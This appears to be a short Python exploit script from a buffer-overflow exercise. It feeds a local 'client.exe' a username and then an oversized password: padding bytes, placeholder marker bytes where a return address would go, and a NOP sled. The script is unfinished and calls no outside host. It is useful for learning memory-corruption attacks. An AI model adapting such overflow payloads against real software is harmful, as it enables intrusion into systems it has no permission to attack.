from subprocess import Popen, PIPE

junk = b"user raul\n"
print(junk)
payload = b"pass "
payload += b"\xAA" * 44
payload += b"\x0a\x0b\x0c\x0d\x01\x02\x03\x04"
payload += b"\x90" * 40
# print("pass", sys.stdout.buffer.write(payload))

p = Popen("Release/client.exe", stdout=PIPE, stdin=PIPE)


# print(p.communicate(junk))
# p.stdout.readline()
p.stdin.write(junk)
p.stdin.flush()
# print(p.stdout.readline())
p.stdin.write(payload)
p.stdin.flush()
# print("Sent password")
# p.terminate()
# print(s)

# print(len(payload))